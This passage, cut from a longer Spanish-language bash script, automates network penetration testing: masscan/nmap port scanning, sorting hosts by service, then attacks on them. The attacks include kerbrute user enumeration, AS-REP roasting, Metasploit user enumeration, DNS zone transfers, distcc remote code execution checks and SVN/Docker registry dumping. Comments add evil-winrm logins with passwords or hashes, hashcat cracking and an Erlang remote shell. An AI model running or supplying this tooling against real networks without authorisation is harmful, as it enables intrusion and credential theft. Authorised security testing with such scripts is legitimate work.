				masscan --interface $iface -p10000,10443,106,1080,1090,1099,110,111,11211,135,139,143,1433,1494,1521,1525,1526,1530,1630,16992,17001,1723,1883,2000,2049,21,22,23,2375,24007,25,27017,27080,28017,3128,3221,3260,3269,32764,3299,3306,3389,3632,3690,37777,389,4369,44134,443,4433,4443,445,44818,464,465,47001,47808,4899,49152,49664,49665,49666,49667,49669,49676,49677,49684,49706,49915,5000,50000,50030,50060,50070,50075,50090,502,5060,541,5432,554,5601,5672,5723,5724,5800,5801,587,5900,5901,593,5984,5985,5986,6000,631,636,6379,7474,80,8009,8010,8080,8081,8082,8086,8098,81,82,8291,83,84,8443,85,86,87,8728,873,88,8800,8888,89,9000,9001,9010,902,9042,9100,9160,9200,9389 --rate=50 -iL  $live_hosts | tee -a .escaneo_puertos/mass-scan.txt
			fi	
			cat .escaneo_puertos/mass-scan.txt | awk '{print $6 ":" $4}' | cut -d "/" -f1 >> .escaneo_puertos/tcp-ports.txt 
		fi
	fi
			
	cat .escaneo_puertos/tcp-especificos.txt  .escaneo_puertos/tcp-ports.txt | sort | uniq >  .escaneo_puertos/tcp.txt 
	sed -i "s/ //g" .escaneo_puertos/tcp.txt
	

	################### UDP escaneo  ###################  


	echo -e "#################### Escaneo de puertos UDP ######################"
	$proxychains nmap -Pn -n -sU -p 53,69,123,161,500,5353,1900,11211,1604,623,47808 --open -iL $live_hosts -oG .escaneo_puertos/nmap-udp.grep 
	nmap-grep.sh .escaneo_puertos/nmap-udp.grep  >> .escaneo_puertos/udp2.txt	
	sort .escaneo_puertos/udp2.txt | uniq > .escaneo_puertos/udp.txt

			
	########## making reportes #######
		echo -e "[+] Creando reporte de escaneo de puertos"  	
		cd .escaneo_puertos
		report-open-ports.pl -l ../$live_hosts -t tcp.txt -u udp.txt
		cd ../
	###################  
	
	################### Ordernar IPs por servicio ###################
	cd .escaneo_puertos	
		echo -e "[+] Ordernar IPs por servicio"  
		grep ":79$" tcp.txt  | uniq >> ../servicios/finger.txt	
		grep ":80$" tcp.txt  | uniq > ../servicios/web2.txt	
		grep ":81$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":82$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":83$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":84$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":85$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":86$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":87$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":89$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":8000$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":8080$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":8081$" tcp.txt  | uniq >> ../servicios/web2.txt	
		grep ":8082$" tcp.txt  | uniq >> ../servicios/web2.txt		
		grep ":8010$" tcp.txt  | uniq >> ../servicios/web2.txt		
		grep ":8800$" tcp.txt  | uniq >> ../servicios/web2.txt		

		grep ":50000$" tcp.txt  | uniq >> ../servicios/jenkins.txt
		grep ":10000$" tcp.txt  | uniq >> ../servicios/webmin.txt 
		grep ":111$" tcp.txt  | uniq >> ../servicios/rpc.txt 
		grep ":135$" tcp.txt  | uniq >> ../servicios/msrpc.txt 

		grep ":541$" tcp.txt  | uniq >> ../servicios/FortiGate.txt 

		# web-ssl
		grep ":443$" tcp.txt  | uniq > ../servicios/web-ssl2.txt
		grep ":8443$" tcp.txt  | uniq >> ../servicios/web-ssl2.txt
		grep ":4443$" tcp.txt  | uniq >> ../servicios/web-ssl2.txt
		grep ":4433$" tcp.txt  | uniq >> ../servicios/web-ssl2.txt	
		grep ":10443$" tcp.txt  | uniq >> ../servicios/web-ssl2.txt	
		
			
		grep ":21$" tcp.txt  | uniq > ../servicios/ftp2.txt
		grep ":513$" tcp.txt  | uniq >> ../servicios/rlogin.txt

		
		grep ":873$" tcp.txt  | uniq >> ../servicios/rsync.txt

		grep ":3128$" tcp.txt  | uniq >> ../servicios/squid.txt
		grep ":8888$" tcp.txt  | uniq >> ../servicios/squid.txt
		grep ":1080$" tcp.txt  | uniq >> ../servicios/proxy.txt

		grep ":1883$" tcp.txt  | uniq >> ../servicios/mosquitto.txt

		
		
		## ssh																	 
		grep ":22$" tcp.txt | uniq >> ../servicios/ssh.txt
		grep ":2375$" tcp.txt | uniq >> ../servicios/docker.txt
		grep ":5000$" tcp.txt | uniq >> ../servicios/dockerRegistry.txt
		
			
		## telnet
		grep ":23$" tcp.txt | uniq >> ../servicios/telnet.txt

		## MAIL																	 
		grep ":25$" tcp.txt  | uniq >> ../servicios/smtp.txt
		grep ":587$" tcp.txt  | uniq >> ../servicios/smtp.txt
		grep ":465$" tcp.txt  | uniq >> ../servicios/smtp.txt
		grep ":110$" tcp.txt  | uniq >> ../servicios/pop.txt 
		grep ":143$" tcp.txt  | uniq >> ../servicios/imap.txt 
		grep ":106$" tcp.txt  | uniq >> ../servicios/pop3pw.txt 

		## ldap																	 
		grep ":389$" tcp.txt  | uniq >> ../servicios/ldap.txt
		grep ":636$" tcp.txt  | uniq >> ../servicios/ldaps.txt
		grep ":11211$" tcp.txt  | uniq >> ../servicios/memcached.txt
		grep ":88$" tcp.txt  | uniq >> ../servicios/kerberos.txt	



		grep ":445$" tcp.txt| uniq >> ../servicios/smb2.txt
		grep ":139$" tcp.txt | uniq >> ../servicios/dcom.txt

		sort ../servicios/smb2.txt ../servicios/dcom.txt > ../servicios/smb.txt; rm ../servicios/smb2.txt	


		# Java related
		
		grep ":8009$" tcp.txt  | uniq >> ../servicios/ajp13.txt
		grep ":9001$" tcp.txt  | uniq >> ../servicios/HSQLDB.txt
				
		grep ":1525$" tcp.txt   | uniq >> ../servicios/informix.txt
		grep ":1530$" tcp.txt   | uniq >> ../servicios/informix.txt
		grep ":1526$" tcp.txt   | uniq >> ../servicios/informix.txt	


		grep ":1521$" tcp.txt   | uniq >> ../servicios/oracle.txt
		grep ":1630$" tcp.txt   | uniq >> ../servicios/oracle.txt
		grep ":5432$" tcp.txt | uniq >> ../servicios/postgres.txt     
		grep ":3306$" tcp.txt   | uniq >> ../servicios/mysql.txt 
		grep ":27017$" tcp.txt  | uniq >> ../servicios/mongoDB.txt 
		grep ":28017$" tcp.txt  | uniq >> ../servicios/mongoDB.txt 
		grep ":27080$" tcp.txt  | uniq >> ../servicios/mongoDB.txt 
		grep ":5984$" tcp.txt  | uniq >> ../servicios/couchDB.txt 
		grep ":6379$" tcp.txt  | uniq >> ../servicios/redis.txt 
		grep ":9000$" tcp.txt  | uniq >> ../servicios/Hbase.txt 
		grep ":9042$" tcp.txt  | uniq >> ../servicios/cassandra.txt 
		grep ":9160$" tcp.txt  | uniq >> ../servicios/cassandra.txt 
		grep ":7474$" tcp.txt  | uniq >> ../servicios/neo4j.txt 
		grep ":8098$" tcp.txt  | uniq >> ../servicios/riak.txt 
			

		# remote desk
		grep ":3389$" tcp.txt | uniq >> ../servicios/rdp.txt
		grep ":4899$" tcp.txt  | uniq >> ../servicios/radmin.txt  
		grep ":5800$" tcp.txt  | uniq >> ../servicios/vnc.txt
		grep ":5801$" tcp.txt  | uniq >> ../servicios/vnc.txt
		grep ":5900$" tcp.txt  | uniq >> ../servicios/vnc.txt
		grep ":5901$" tcp.txt  | uniq >> ../servicios/vnc.txt

		#Virtual
		grep ":902$" tcp.txt  | uniq >> ../servicios/vmware.txt	
		grep ":1494$" tcp.txt  | uniq >> ../servicios/citrix.txt    

			
		#Misc      
		
		grep ":8291$" tcp.txt  | uniq >> ../servicios/winbox.txt	
		grep ":6000$" tcp.txt  | uniq >> ../servicios/x11.txt
		grep ":631$" tcp.txt  | uniq >> ../servicios/cups.txt
		grep ":9100$" tcp.txt  | uniq >> ../servicios/printers.txt	
		grep ":2049$" tcp.txt  | uniq >> ../servicios/nfs.txt
		grep ":5723$" tcp.txt  | uniq >> ../servicios/SystemCenter.txt
		grep ":5724$" tcp.txt  | uniq >> ../servicios/SystemCenter.txt	
		grep ":1433$" tcp.txt  | uniq >> ../servicios/mssql.txt 
		grep ":37777$" tcp.txt  | uniq >> ../servicios/dahua_dvr.txt
		grep ":9200$" tcp.txt  | uniq >> ../servicios/elasticsearch.txt 	
		grep ":3221$" tcp.txt  | uniq >> ../servicios/juniper.txt 	

		grep ":554$" tcp.txt  | uniq >> ../servicios/camaras-ip.txt
			

		#Esp
		grep ":16992$" tcp.txt  | uniq >> ../servicios/intel.txt 	
		grep ":5601$" tcp.txt  | uniq >> ../servicios/kibana.txt 	

		grep ":47808$" tcp.txt  | uniq >> ../servicios/BACnet.txt 
		grep ":502$" tcp.txt  | uniq >> ../servicios/ModBus.txt 	

		#backdoor
		grep ":32764$" tcp.txt  | uniq >> ../servicios/backdoor32764.txt

		#pptp
		grep ":1723$" tcp.txt  | uniq >> ../servicios/pptp.txt
		grep ":47001$" tcp.txt  | uniq >> ../servicios/WinRM.txt
		grep ":5985$" tcp.txt  | uniq >> ../servicios/WinRM.txt
		#evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
		#evil-winrm -u <username> -H <Hash> -i <IP>
		grep ":5986$" tcp.txt  | uniq >> ../servicios/WinRM.txt
		# openssl req -newkey rsa:2048 -nodes -keyout request.key -out request.csr
		# evil-winrm -i 10.10.10.103 -c certnew.cer -k request.key --port 5986 --ssl
		grep ":9389$" tcp.txt  | uniq >> ../servicios/RSAT.txt


		grep ":1099$" tcp.txt  | uniq >> ../servicios/rmi.txt
		grep ":1090$" tcp.txt  | uniq >> ../servicios/rmi.txt
		grep ":9010$" tcp.txt  | uniq >> ../servicios/rmi.txt

		grep ":1883$" tcp.txt  | uniq >> ../servicios/mosquitto.txt
		grep ":3260$" tcp.txt  | uniq >> ../servicios/iscsi.txt
		grep ":3299$" tcp.txt  | uniq >> ../servicios/SAProuter.txt

		grep ":3632$" tcp.txt  | uniq >> ../servicios/distccd.txt
		grep ":3690$" tcp.txt  | uniq >> ../servicios/svn.txt
		grep ":4369$" tcp.txt  | uniq >> ../servicios/erlang.txt

		grep ":5672$" tcp.txt  | uniq >> ../servicios/RabbitMQ.txt

	#TODO
		#grep ":5985$" tcp.txt  | uniq >> ../servicios/OMI.txt
		#grep ":5986$" tcp.txt  | uniq >> ../servicios/OMI.txt
		
		grep ":8086$" tcp.txt  | uniq >> ../servicios/InfluxDB.txt

		#grep ":24007$" tcp.txt  | uniq >> ../servicios/GlusterFS.txt
		#grep ":49152$" tcp.txt  | uniq >> ../servicios/GlusterFS.txt

		grep ":44134$" tcp.txt  | uniq >> ../servicios/helm.txt
		grep ":44818$" tcp.txt  | uniq >> ../servicios/EtherNet.txt

		grep ":50030$" tcp.txt  | uniq >> ../servicios/hadoop-jobtracker.txt
		grep ":50060$" tcp.txt  | uniq >> ../servicios/hadoop-tasktracker.txt
		grep ":50070$" tcp.txt  | uniq >> ../servicios/hadoop-namenode.txt
		grep ":50075$" tcp.txt  | uniq >> ../servicios/hadoop-datanode.txt
		grep ":50090$" tcp.txt  | uniq >> ../servicios/hadoop-secondary.txt
		
		########### Delete printers/ipcameras/voip from web servers list ######3
		cat ../servicios/printers.txt ../servicios/voip.txt ../servicios/camaras-ip.txt 2>/dev/null | cut -d ":" -f1 | sort | uniq > ../servicios/no-web-ip.txt
		echo "" > ../servicios/no-web.txt
		for line in $(cat ../servicios/no-web-ip.txt); do
			grep $line ../servicios/web2.txt >> ../servicios/no-web.txt
			grep $line ../servicios/web-ssl2.txt >> ../servicios/no-web.txt
			grep $line ../servicios/ftp2.txt >> ../servicios/no-web.txt
		done
		sort ../servicios/no-web.txt -o ../servicios/no-web.txt 2>/dev/null
		sort ../servicios/web2.txt -o ../servicios/web2.txt 2>/dev/null
		sort ../servicios/web-ssl2.txt -o ../servicios/web-ssl2.txt 2>/dev/null
		sort ../servicios/ftp2.txt -o ../servicios/ftp2.txt 2>/dev/null
		
		comm -13 ../servicios/no-web.txt ../servicios/web2.txt > ../servicios/web.txt 2>/dev/null
		comm -13 ../servicios/no-web.txt ../servicios/web-ssl2.txt > ../servicios/web-ssl.txt 2>/dev/null
		comm -13 ../servicios/no-web.txt ../servicios/ftp2.txt > ../servicios/ftp.txt 2>/dev/null
		#######################
	cd ..

	
	
	##################UDP#########
	cd .escaneo_puertos
		#grep "53/open/" nmap-udp.grep | awk '{print $2}' | perl -ne '$_ =~ s/\n//g; print "$_:53\n"' | uniq >> ../servicios/dns.txt
		grep --color=never ":53$" udp.txt  | uniq >> ../servicios/dns.txt
		grep --color=never ":161$" udp.txt | uniq >> ../servicios/snmp2.txt
		grep --color=never ":67$" udp.txt  | uniq >> ../servicios/dhcp.txt
		grep --color=never ":69$" udp.txt  | uniq >> ../servicios/tftp.txt		
		grep --color=never ":500$" udp.txt  | uniq >> ../servicios/vpn.txt		
		grep --color=never ":1604$" udp.txt  | uniq >> ../servicios/citrix.txt		
		grep --color=never ":1900$" udp.txt  | uniq >> ../servicios/upnp.txt		
		grep --color=never ":623$" udp.txt  | uniq >> ../servicios/IPMI.txt
		grep --color=never ":5353$" udp.txt  | uniq >> ../servicios/mDNS.txt
		grep --color=never ":47808$" udp.txt  | uniq >> ../servicios/BACNet.txt
		
	cd ../        
	find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	################################
	echo -e "########################################### "
fi # Port scan  
   


# FASE: 3
echo -e "\n\n$OKYELLOW [+] FASE 3: ENUMERACION DE PUERTOS E IDENTIFICACION DE VULNERABILIDADES \n $RESET"
###################################  ENUMERACION ########################################

#Borrar descargas
rm -rf webClone/*
echo "########### internet $internet #############"
# IP publica
curl  --max-time 10 'https://api.ipify.org?format=json' > .enumeracion/"$ip"_ip_publica.txt

if [ "$PROXYCHAINS" == "s" ]; then 
	proxychains="proxychains"
else
	proxychains=""
fi

if [ -f servicios/ldap.txt ]
then
	echo -e "$OKBLUE #################### LDAP (`wc -l servicios/ldap.txt`) ######################$RESET"	    
	while read line          
	do        
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		
		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo dominio y dnsHostName"				
		$proxychains nmap -n -Pn -sT -p $port --script ldap-rootdse $ip > logs/enumeracion/"$ip"_"$port"_LDAP.txt
		dominioAD_DC=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep --color=never namingContexts | sed 's/|       namingContexts: //g'  | grep -v 'CN='| head -1`
		#$dominioAD_DC 	DC=eurocorp,DC=local	
		dnsHostName=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep dnsHostName | awk '{print $3}'`	
		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt					

		
		dominioAD=`echo "${dominioAD_DC/,DC=/.}"` #DC=eurocorp.local
		dominioAD=`echo "${dominioAD/DC=/}"` #eurocorp.local
		echo $dominioAD > .enumeracion/"$ip"_"$port"_dominioAD.txt		
		echo "dominioAD $dominioAD "
		###### LDAP ######
		if [ -z "$dominioAD_DC" ]; then			
			echo -e "\t[i] No se pudo obtener el dominio "
		else
			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
			echo "$proxychains ldapsearch -x -H \"ldap://$ip\"  -b $dominioAD_DC -s sub \"(objectclass=*)\"" > logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			$proxychains ldapsearch -x -H "ldap://$ip"  -b "$dominioAD_DC" -s sub "(objectclass=*)" >> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 2>> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt
					
			egrep -iq "successful bind must be completed|Not bind|Operation unavailable|Can't contact LDAP server" logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
			else
				echo -e "\t$OKRED[!] Conexión anónima detectada \n $RESET"
				cp logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			fi
		
		fi # fin sin dominio
				
		####################        
		
		 echo ""
 	done <servicios/ldap.txt
		
	#insert clean data	
	insert_data
fi	



#LDAPS
if [ -f servicios/ldaps.txt ]
then
	echo -e "$OKBLUE #################### LDAPS (`wc -l servicios/ldaps.txt`) ######################$RESET"	    
	while read line       
	do     					
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	

		echo -e "[+] Escaneando $ip:$port"	
		echo -e "\t[+] Obteniendo dominio y dnsHostName"				
		$proxychains nmap -n -Pn -sT -p $port --script ldap-rootdse $ip > logs/enumeracion/"$ip"_"$port"_LDAP.txt
		dominioAD_DC=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep --color=never namingContexts | sed 's/|       namingContexts: //g'  | grep -v 'CN='| head -1`
		#$dominioAD_DC 	DC=eurocorp,DC=local	
		dnsHostName=`cat logs/enumeracion/"$ip"_"$port"_LDAP.txt | grep dnsHostName | awk '{print $3}'`	
		echo $dnsHostName > .enumeracion/"$ip"_"$port"_dnsHostName.txt					

		
		dominioAD=`echo "${dominioAD_DC/,DC=/.}"` #DC=eurocorp.local
		dominioAD=`echo "${dominioAD/DC=/}"` #eurocorp.local
		echo $dominioAD > .enumeracion/"$ip"_"$port"_dominioAD.txt		
		echo "dominioAD $dominioAD "
		###### LDAP ######
		if [ -z "$dominioAD_DC" ]; then			
			echo -e "\t[i] No se pudo obtener el dominio "
		else
			echo -e "\t[+] Probando vulnerabilidad de conexión anónima con el dominio $dominio"
			echo "$proxychains ldapsearch -x -H \"ldaps://$ip\"  -b $dominioAD_DC -s sub \"(objectclass=*)\"" > logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			$proxychains ldapsearch -x -H "ldaps://$ip"  -b "$dominioAD_DC" -s sub "(objectclass=*)" >> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 2>> logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt
					
			egrep -iq "successful bind must be completed|Not bind|Operation unavailable|Can't contact LDAP server" logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then						
				echo -e "\t$OKGREEN[i] Requiere autenticación $RESET"
			else
				echo -e "\t$OKRED[!] Conexión anónima detectada \n $RESET"
				cp logs/vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt .vulnerabilidades/"$ip"_"$port"_directorioLDAP.txt 
			fi
		
		fi # fin sin dominio

		##########################
													 
		 echo ""
 	done <servicios/ldaps.txt
	
	#insert clean data	
	insert_data
fi



if [ -f servicios/kerberos.txt ]
then
	echo -e "$OKBLUE #################### kerberos (`wc -l servicios/kerberos.txt`) ######################$RESET"	    		
	for line in $(cat servicios/kerberos.txt); do
        ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		DOMINIO_AD=`cat .enumeracion2/"$ip"_*_dominioAD.txt | head -1 ` #eurocorp.local
		
		echo -e "[+] Escaneando $ip:$port (DOMINIO_AD $DOMINIO_AD)"	
		if [ -z "$DOMINIO_AD" ]
		then
			DOMINIO_AD=`nmap -Pn -sV -n -p $port $ip | grep 'Host:' | awk '{print $4}'`
			echo -e "[+] \t DOMINIO_AD ($DOMINIO_AD)"	
		fi				
		
		echo -e "[+] \t kerbrute ($DOMINIO_AD)"	
		echo "kerbrute userenum $common_user_list --dc $ip -d $DOMINIO_AD" > logs/enumeracion/"$ip"_kerbrute_users.txt
		$proxychains  kerbrute userenum $common_user_list --dc $ip -d $DOMINIO_AD --output logs/enumeracion/"$ip"_kerbrute_users.txt		
		grep "VALID USERNAME" logs/enumeracion/"$ip"_kerbrute_users.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .enumeracion/"$ip"_kerbrute_users.txt
		#kerbrute bruteforce --domain svcorp.com  userpass.txt --dc 10.11.1.20


		if [ ! -z "$DOMINIO_AD" ] #test.local
		then
			echo "ASREPRoast test"
			echo "DOMINIO_AD $DOMINIO_AD" | tee -a  logs/vulnerabilidades/"$ip"_"$port"_ASREPRoast.txt
			$proxychains  GetNPUsers.py "$dominioAD" -no-pass -usersfile $common_user_list -format hashcat -dc-ip $ip >> logs/vulnerabilidades/"$ip"_"$port"_ASREPRoast.txt
			grep "krb5as" logs/vulnerabilidades/"$ip"_"$port"_ASREPRoast.txt > .vulnerabilidades/"$ip"_"$port"_ASREPRoast.txt
			# ./hashcat.bin -m 18200 -a 0 hash-kerberos.txt /media/sistemas/Passwords/Passwords -o cracked.txt #hash.txt tiene todos los datos no solo hash
		fi				
		
		echo -e "[+] \t rpcEnumUsers"	
		$proxychains msfconsole -x "use auxiliary/scanner/smb/smb_enumusers;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt 2>/dev/null							   
		egrep --color=never -i "Administrator" logs/enumeracion/"$ip"_"$port"_rpcEnumUsers.txt  >> .enumeracion/"$ip"_"$port"_rpcEnumUsers.txt
					
    done;           
	insert_data
    
fi	


if [ -f servicios/dns.txt ]
then
	echo -e "$OKBLUE #################### DNS (`wc -l servicios/dns.txt`) ######################$RESET"	  
	for line in $(cat servicios/dns.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"

		if [ "$internet" == "n" ]; then 
			DOMINIO=`cat .enumeracion/"$ip"_*_dominioAD.txt | head -1 ` #eurocorp.local

			if [ -z "$DOMINIO" ]; then
				DOMINIO=$DOMINIO_INTERNO				
			fi

			echo -e "[+] DOMINIO $DOMINIO"
			if [ ! -z "$DOMINIO" ] && [ "$DOMINIO" != NULL ]  ; then
				### zone transfer ###	
				echo -e "\t [+] Probando transferencia de zona (DOMINIO $DOMINIO)" 		
				zone_transfer=`$proxychains dig -tAXFR @$ip $DOMINIO`
				echo "dig -tAXFR @$ip $DOMINIO" > logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
				echo $zone_transfer >> logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
				if [[ ${zone_transfer} != *"failed"*  && ${zone_transfer} != *"timed out"* && ${zone_transfer} != *"error"* ]];then
					echo $zone_transfer > .vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
					echo -e "\t$OKRED[!] Transferencia de zona detectada \n $RESET"
				else
					
					echo -e "\t$OKGREEN[i] No se pudo realizar la transferencia de zona$RESET"
				fi	


				if [ "$PROXYCHAINS" == "n" ]; then 															
					echo -e "\t [+] Bruteforce domains"
					echo "dnsenum --threads 100 --dnsserver $ip -f $common_subdomains $DOMINIO" > logs/enumeracion/"$ip"_dns_enum.txt 
					dnsenum --threads 100 --dnsserver $ip -f $common_subdomains $DOMINIO | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> logs/enumeracion/"$ip"_dns_enum.txt 2>/dev/null
					grep -i $DOMINIO logs/enumeracion/"$ip"_dns_enum.txt | egrep -v 'dnsenum|---' > .enumeracion/"$ip"_dns_enum.txt
				fi  
				
			else
				echo -e "\t [+] Dominio no disponible (DOMINIO = $DOMINIO)" 		
			fi #null domain
		else
			#open resolver
			echo -e "\t [+] Probando si es un servidor DNS openresolver"
			dig ANY google.com @$ip +short | grep --color=never google | egrep -iv "failed|DiG" > .vulnerabilidades/"$ip"_53_openresolver.txt 2>/dev/null &																			
		fi #intenet
		
			
	done
	
	# revisar si hay scripts ejecutandose
	while true; do
	dig_instancias=`ps aux | egrep 'dig' | grep -v digitalocean| wc -l`		
	if [ "$dig_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($dig_instancias)"				
		sleep 10
		else
			break		
		fi
	done	# done true	
	#insert clean data	
	insert_data		
fi


if [ -f servicios/iscsi.txt ]
	then
	echo -e "$OKBLUE #################### iscsi (`wc -l servicios/iscsi.txt`) ######################$RESET"	    
	for line in $(cat servicios/iscsi.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		$proxychains nmap -n -sT -Pn --script=iscsi-info -p $port $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_"$port"_info.txt 

		$proxychains iscsiadm -m discovery -t sendtargets -p $ip:$port > logs/enumeracion/"$ip"_"$port"_discovery.txt 
		#iscsiadm -m node --targetname="iqn.1992-05.com.emc:fl1001433000190000-3-vnxe" -p 123.123.123.123:3260 --login
		
	done

	insert_data
fi


if [ -f servicios/SAProuter.txt ]
	then
	echo -e "$OKBLUE #################### SAProuter (`wc -l servicios/SAProuter.txt`) ######################$RESET"	    
	for line in $(cat servicios/SAProuter.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_service_discovery;set RHOSTS $ip;exploit;exit" > logs/enumeracion/"$ip"_"$port"_discovery.txt 2>/dev/null
		grep '\[+\]' logs/enumeracion/"$ip"_"$port"_discovery.txt > .enumeracion/"$ip"_"$port"_discovery.txt

		$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_router_info_request;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_info.txt 2>/dev/null
		grep '\[+\]' logs/vulnerabilidades/"$ip"_"$port"_info.txt > .vulnerabilidades/"$ip"_"$port"_info.txt

		#$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_router_portscanner;set RHOSTS $ip;set INSTANCES 00-50;run;exit" > logs/vulnerabilidades/"$ip"_"$port"_portscanner.txt 2>/dev/null
		#grep '\[+\]' logs/vulnerabilidades/"$ip"_"$port"_portscanner.txt > .vulnerabilidades/"$ip"_"$port"_portscanner.txt

		#use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem 
		

		
	done

	insert_data
fi


if [ -f servicios/distccd.txt ]
	then
	echo -e "$OKBLUE #################### distccd (`wc -l servicios/distccd.txt`) ######################$RESET"	    
	for line in $(cat servicios/distccd.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		$proxychains  nmap -n -Pn --script=distcc-exec -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_rce.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rce.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_rce.txt 				
		
	done

	insert_data
fi


if [ -f servicios/svn.txt ]
	then
	echo -e "$OKBLUE #################### svn (`wc -l servicios/svn.txt`) ######################$RESET"	    
	for line in $(cat servicios/svn.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		#list
		echo "svn ls svn://$ip" > logs/enumeracion/"$ip"_"$port"_svnEnum.txt
		$proxychains svn ls svn://$ip >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt

		#Download the repository
		echo "svn checkout svn://$ip" >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
		$proxychains svn checkout svn://$ip >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt

		#Commit history
		echo "svn log svn://$ip"  >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt
		$proxychains svn log svn://$ip  >> logs/enumeracion/"$ip"_"$port"_svnEnum.txt

		#svn up -r 2 #Go to revision 2 inside the checkout folder
	done

	insert_data
fi


if [ -f servicios/erlang.txt ]
	then
	echo -e "$OKBLUE #################### erlang (`wc -l servicios/erlang.txt`) ######################$RESET"	    
	for line in $(cat servicios/erlang.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		$proxychains nmap -sT -Pn -n -p $port --script epmd-info $ip >> logs/enumeracion/"$ip"_"erlang"_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_"erlang"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_"erlangt"_info.txt 
		
		#erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
		#os:cmd("id").

	done

	insert_data
fi


if [ -f servicios/dockerRegistry.txt ]
	then
	echo -e "$OKBLUE #################### dockerRegistry (`wc -l servicios/dockerRegistry.txt`) ######################$RESET"	    
	for line in $(cat servicios/dockerRegistry.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		$proxychains DockerGraber.py http://$ip  --list > logs/vulnerabilidades/"$ip"_"$port"_auth.txt
		grep '\[+\]' logs/vulnerabilidades/"$ip"_"$port"_auth.txt > .vulnerabilidades/"$ip"_"$port"_auth.txt 
		#DockerGraber.py http://127.0.0.1  --dump_all
		
	done

	insert_data
fi


if [ -f servicios/mDNS.txt ]
	then
	echo -e "$OKBLUE #################### mDNS (`wc -l servicios/mDNS.txt`) ######################$RESET"	    
	for line in $(cat servicios/mDNS.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
